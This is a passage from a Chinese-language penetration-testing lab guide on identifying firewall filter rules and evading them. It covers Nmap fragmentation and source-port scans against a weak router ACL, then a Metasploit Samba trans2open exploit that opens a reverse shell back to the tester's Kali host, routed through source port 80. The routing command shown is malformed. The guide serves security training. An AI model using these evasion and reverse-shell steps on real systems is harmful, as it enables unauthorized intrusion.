接下来，我们应该使用 Hping 工具做与之前相同的事情，但我们会为您省去麻烦。Iptables 不会像路由器那样做出响应；当它在过滤某些东西时，iptables 根本不会做出响应。正如我们多次所述，这就是测试的全部意义：您创建一个实验环境，应用不同的设置和配置，然后查看哪些有效，哪些无效。

现在，我们准备查看 Smoothwall 防火墙。由于我们正在测试防火墙，根据我们的设计，我们有几个选项。我们可以先测试路由器，然后再测试防火墙。但是，在测试过程中，我们希望尽可能简单。因此，我们将直接测试防火墙；我们的网络设计示例如下截图所示：

![识别防火墙规则](img/477-1_07_50.jpg)

我们必须再次建立我们的路由。现在我们的目标是 VMnet3 交换机，因此我们必须路由到该网络。

### 注意

我们不需要在这里打开 IP 转发，因为 Smoothwall 机器会为我们处理。

我们需要注意 metasploitable 机器的 IP 地址。在本书之前设置机器时，我们在 VMnet3 交换机上设置了 DHCP 服务器；因此，该机器应该在启动时获取了一个地址。要确定 IP 地址，您需要登录到机器上，输入`msfadmin`和`msfadmin`作为密码。登录后，输入`ifconfig`并显示接口信息。示例如下截图所示：

![识别防火墙规则](img/477-1_07-51.jpg)

### 注意

如果地址与您创建的地址不同，那么您可能需要修改它以匹配目标机器上的地址。同样，我们之前已经涵盖了这一点，因此在这里不再涵盖。为了避免这种情况，您可以将地址配置为静态地址，并在启动时分配。

提醒：您需要在 metasploitable 机器上添加路由；为此，您需要使用`sudo`命令。添加路由的命令如下：

```
sudo add -net 10.2.0.0 gw 10.3.0.10 netmask 255.255.255.0 dev eth0

```

一旦您设置好了路由，就可以使用之前讨论过的任何方法进行测试。使用 telnet 进行测试的示例如下截图所示：

![识别防火墙规则](img/477-1_07-52.jpg)

现在，我们已经准备好通过防火墙测试目标。与之前一样，最简单的方法是使用我们的工具 Nmap。此外，我们还想运行 Wireshark，并进行比较，看看与直接扫描机器时是否有任何不同。在您的 Kali 机器上，输入`nmap 10.3.0.128`来扫描目标。请记住，如果您有不同的 IP 地址，您需要输入该地址。Nmap 扫描的示例如下截图所示：

![识别防火墙规则](img/477-1_07-53.jpg)

正如前面的屏幕截图所示，我们在 Wireshark 和 Smoothwall 机器上进行的测试并没有太大的区别。你可能还记得，当我们在数据包级别检查结果时，我们发现 Smoothwall 机器有时会以 ICMP 消息做出响应；它是一种目标不可达类型的消息，代码是端口不可达。扫描中 ICMP 消息的示例如下屏幕截图所示：

![识别防火墙规则](img/477-1_07-54.jpg)

屏幕显示了扫描中 ICMP 消息的示例（裁剪的文本不重要）

正如前面的屏幕截图所示，我们确实有 ICMP 消息，所以这是我们可以做个记录的事情。在发现阶段，如果我们找到一个使用 Smoothwall 防火墙的客户端，我们将有关于如何对其进行操作的数据。欢迎继续、测试数据，并看看你能发现什么；一如既往，请记得记录一切。对于我们的目的，我们已经实现了本节的目标，我们准备继续进行下一节。

# 渗透过滤器的技巧

根据我们在本章中发现的内容，你会发现当我们遇到一个设备时，我们成功瞄准它甚至穿透它的能力受到管理员为使设备尽可能受限所付出的工作量的限制。

尽管如此，有时管理员会犯错误，这是我们作为专业安全测试人员的工作的一部分。我们必须找到这些现有的错误并记录下来，以便客户可以修复它们。

我们继续看到的一件事是弱的过滤规则，这是一个长期存在的问题。尽管有了新产品，我们在测试时仍然可以找到弱的过滤规则；因此，在结束本章之前的最后一节将处理如何检测这些规则。

我们将创建并测试第一个弱过滤规则，以便记录结果，这些规则通常在无状态过滤器和路由器中遇到。我们将使用我们的 Dynamips 虚拟机，目标将是 OWASP 机器。在你的路由器机器上，打开一个终端窗口，并输入以下命令来运行你的 Dynamips 机器：

```
dynamips –H 7200 &
dynagen config.net

```

正如你所看到的，这次我们在后台运行命令，以避免打开另一个终端窗口；如果你想使用单独的窗口，那就由你决定。我们需要创建一个弱规则，然后进行一系列技术测试，看看我们可以使用哪一种来从过滤器后面的目标获取额外的信息。一旦你的路由器启动，输入以下命令：

```
console R1
en
conf t
ip access-list extended External
permit tcp any eq 80 any

```

按下 *Ctrl* + *Z*，然后输入以下命令：

```
Show ip access-lists

```

配置示例如下屏幕截图所示：

![渗透过滤器的技巧](img/477-1_07-55.jpg)

我们现在已经设置了一个弱的过滤规则，这在测试时相当常见。一些管理员会添加一个用于返回流量的规则，并允许所有来自某个端口的流量通过。我们在这里使用的是端口 80，但最常见的是在端口 20、53 和 67 上找到。微软的防火墙存在漏洞，已知允许所有源端口为 88（Kerberos）的流量通过过滤器。

我们在路由器上添加了一个新规则，如果我们进行一些研究，我们会发现有渗透防火墙的技术，所以我们现在将尝试其中一种。我们想尝试的第一种是分段扫描，所以在 Kali 中输入 `nmap –f 10.2.0.132` 来对目标进行分段扫描。结果的示例如下屏幕截图所示：

![渗透过滤器的技巧](img/477-1_07-56.jpg)

好吧，这次扫描甚至没有检测到一个开放的端口，所以我们可以记录下来并继续。正如前面提到的，可以尝试许多不同的扫描，您的成功将取决于您所面对的管理员。我们将再看一个，鼓励您自行探索其他方法。您可以在[`pentestlab.wordpress.com/2012/04/02/nmap-techniques-for-avoiding-firewalls/`](http://pentestlab.wordpress.com/2012/04/02/nmap-techniques-for-avoiding-firewalls/)找到许多技术的列表。

接下来，我们将看一下通常会为您提供最大成功的技术，这也是我们之前提到的技术。过滤器中的一个常见弱点是允许从某个端口返回流量的规则。幸运的是，使用 Nmap，我们有一个源端口扫描选项，所以我们总是可以从特定端口发送我们的流量。我们想要进行扫描并使用这个选项。在您的 Kali 终端窗口中，输入 `nmap –g 80 10.2.0.132`。`g` 选项将指示流量来自输入的端口，这种情况下是端口 80。示例如下截图所示：

![穿透过滤器的技巧](img/477-1_07-57.jpg)

成功！我们现在对过滤器后面的目标有了更多的细节；因此，我们现在可以按照我们的正常测试方法对其进行测试，只要我们从源端口 80 生成我们的流量。

由于我们可以访问过滤器后面的机器上打开的所有端口，让我们进一步调查一下。我们可以尝试使用漏洞扫描程序，但在大多数情况下，它们并不是设计用来穿过过滤器的，所以我们将不得不手动从目标上运行的服务中提取信息，并查看是否能找到一些可能成为我们攻击向量的东西，假设我们可以从端口 80 发送我们的攻击。这是我们需要进一步研究的事情。

首先，我们想要查看这些端口上运行了什么，所以我们可以使用 Nmap 从这些端口获取横幅。

### 注意

您也可以使用 Netcat 来绕过过滤器并使用 `-p` 选项来从特定源端口到达目标。这留作读者的练习。

我们可以使用许多不同的扫描技术来从目标获取服务信息；我们将使用其中一种较老但仍然有效且比一些新技术更快的技术。在您的 Kali 机器终端窗口中，输入 `nmap -g 80 –sV 10.2.0.132` 来获取服务的横幅。示例如下截图所示：

![穿透过滤器的技巧](img/477-1_07-58.jpg)

在前面的截图中，有趣的是扫描显示端口 139 和 145 是开放的，这些端口通常在 Windows 平台上找到。

从这里开始，流程是寻找服务或操作系统的易受攻击版本，然后尝试利用漏洞进行攻击。为了执行这个过程，我们将使用另一台用于测试的机器，那台机器是来自[`www.kioptrix.com/blog/`](http://www.kioptrix.com/blog/)的 Kioptrix 发行版。我们可以从该网站下载许多发行版。我们将使用 **Level 1** 版本。流程是打开虚拟机并在设置中将其连接到 VMnet2 网络；通过这样做，我们有一台可以进行测试的机器。

虚拟机设置的示例如下截图所示：

![穿透过滤器的技巧](img/477-1_07-59.jpg)

一旦机器启动，我们需要确定 DHCP 服务器分配的 IP 地址。我们可以通过扫描 VMnet2 子网来做到这一点。

在您的 Kali 机器终端窗口中输入 `nmap –g 20 –sP 10.2.0.100-200` 进行针对 VMnet2 网络的 ping 扫描。我们有幸知道 DHCP 服务器的起始和结束 IP 范围，所以我们将在这里使用它来加快扫描速度。扫描的示例如下截图所示：

![穿透过滤器的技巧](img/477-1_07-60.jpg)

我们看到我们的结果中有三个目标，我们知道 132 号机器是 OWASP，135 号机器是我们的 Kali 机器；因此，我们感兴趣的目标是 140 号机器。这一切都是因为路由器上的弱过滤器配置。一旦我们找到了突破口，我们将继续使用它。我们需要知道目标上运行的服务，所以输入`nmap –g 80 –sV 10.2.0.140`来显示目标的服务信息。我们知道这个目标机器不是 Windows 机器，但我们在目标上看到了类似 Windows 端口的开放。

由于这种情况，我们可以得出结论，samba 正在运行在这台机器上。有许多 samba 漏洞；我们可以对它们进行研究，并尝试看看我们是否成功。

我们介绍了许多发现漏洞的技术，我们将为您节省一些麻烦，看看一些可用的 samba 利用程序。如果输入`msfconsole`来启动 metasploit 工具，程序启动需要一些时间，一旦启动，我们想使用出色的搜索功能；输入`search samba`。以下截图显示了部分结果的示例：

![渗透过滤器的技巧](img/477-1_07-61.jpg)

如前面的截图所示，我们有许多可用的利用程序；我们希望选择评级为“优秀”或更高的那些，因为这将提供最大的成功机会。话虽如此，成功并不保证，但这就是利用的现实。那么，你会选择哪一个？好吧，我们已经讨论了研究的概念，这就是你找出哪一个对你最有效的方法。我们将为您节省时间；在您的 metasploit 窗口中输入以下内容：

```
use exploit/linux/samba/trans2open
set RHOST 10.2.0.140
set payload linux/x86/shell/reverse_tcp
set LHOST 10.2.0.135
set LPORT 123
exploit

```

我们使用 Kali 机器作为反向 shell 的连接，并使用端口 123 让它到达我们这里。通常不会被检查，因此通常会非常有效。这个利用将失败，因为没有流量来自的源端口。以下截图显示了一个示例：

![渗透过滤器的技巧](img/477-1_07-62.jpg)

如前面的截图所示，利用程序无法到达目标。好吧，我们知道我们有办法到达目标，这涉及将流量设置为来自特定源端口，那么我们该怎么办？幸运的是，metasploit 的创建者为我们提供了一种方法来做到这一点，但这并不为人所知，实际上也没有很好的文档记录，因此它随时可能消失；因此，最好保留旧的虚拟机，以防我们喜欢的东西消失。我们指的是`CPORT`选项；因此，在 metasploit 工具中输入以下命令，将所有流量从源端口 80 发送到目标：

```
set CPORT 80

```

然后，输入利用程序再次尝试。以下截图显示了一个示例：

![渗透过滤器的技巧](img/477-1_07-63.jpg)

同样，如果您的利用程序失败，这并不罕见，一个选择是设置网络平面，然后尝试利用程序。不幸的是，这里没有什么保证。最重要的是，您知道如何发现过滤器的存在，并知道如何尝试渗透过滤器的方法。

接下来要做的事情是尝试相同的过程和方法来攻击 iptables 机器。结果非常相似；因此，我们将把这留作一个作业任务，供那些想要练习的人。一如既往，记录下你的所有发现，并继续实验和学习。

# 总结

在本章中，我们建立了一个系统化的逐步过程，用于对各种设备进行评估。我们从路由器设备开始这一章，然后转向交换机。在路由器和交换机之后，我们转向讨论遇到防火墙时该怎么办。

一旦我们学会了处理多种不同的设备，我们就转向了识别现有过滤规则的方法。我们发现了何时以及如何对某些设备进行扫描时，它们的响应不符合 RFC 中规定的标准；此外，我们能够发现，当设备上存在规则时，通常会有一个端口的响应为我们提供了针对该设备进一步操作的额外细节。

最后，我们讨论了渗透过滤器的技巧，并研究了使用分段扫描；然而，这并没有取得太大的成功。然后，我们研究了强大的源端口扫描技术，事实上，这在允许我们枚举有关目标的额外信息方面非常成功；此外，我们展示了如果找到源端口的弱点，我们有选择从特定源端口发起攻击的选项。

这结束了本章。现在你已经有了一个处理设备时的完整流程和方法。正如我们在本章中讨论的，你将会有很多时候会在设备上寻找突破的方法，但这是专业安全测试的一部分，也是你学到最多的时候。事实上，在大多数情况下，你挣扎得越多，学到的就越多。始终记得记录你观察到的所有事情。这是一个谨慎和专业的测试人员在构建和测试他们的虚拟实验室时会采用的习惯。在下一章中，我们将看看如何设计一个 IDS/IPS 范围。
